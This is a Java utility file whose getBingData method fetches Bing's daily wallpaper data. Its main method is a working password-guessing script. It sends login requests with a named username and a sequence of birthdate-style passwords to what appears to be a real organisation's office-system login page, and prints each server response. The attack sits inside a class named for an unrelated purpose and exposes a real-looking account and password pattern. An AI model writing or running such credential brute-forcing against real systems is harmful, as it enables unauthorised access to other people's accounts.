package org.yl.ims.util;

import java.io.IOException;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.HttpMethod;
import org.apache.commons.httpclient.methods.GetMethod;

public class Bing {
	public static String getBingData(int previous) {
		String url = "http://cn.bing.com/HPImageArchive.aspx?format=js&idx="
				+ previous + "&n=1";
		HttpClient client = new HttpClient();
		HttpMethod method = new GetMethod(url);
		String strJson = "";
		try {
			client.executeMethod(method);
			strJson = method.getResponseBodyAsString();
		} catch (HttpException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		// 释放连接
		method.releaseConnection();
		return strJson;
	}

	public static void main(String[] args) {
		for (int i=0;i<33;i++) {
			String str = "";
			if (i<10) {
				str = "0"+i;
			}else{
				str = i+"";
			}
			String url = "https://oa.cshtz.cn/cas/checkLogin.jsp?userName=lipingbo&pwd=196607"+str;
			HttpClient client = new HttpClient();
			HttpMethod method = new GetMethod(url);
			String strJson = "";
			try {
				client.executeMethod(method);
				strJson = method.getResponseBodyAsString();
			} catch (HttpException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
			System.out.println("尝试用密码196607"+str+"登陆");
			// 释放连接
			method.releaseConnection();
			System.out.println(strJson);
		}
		
	}
}
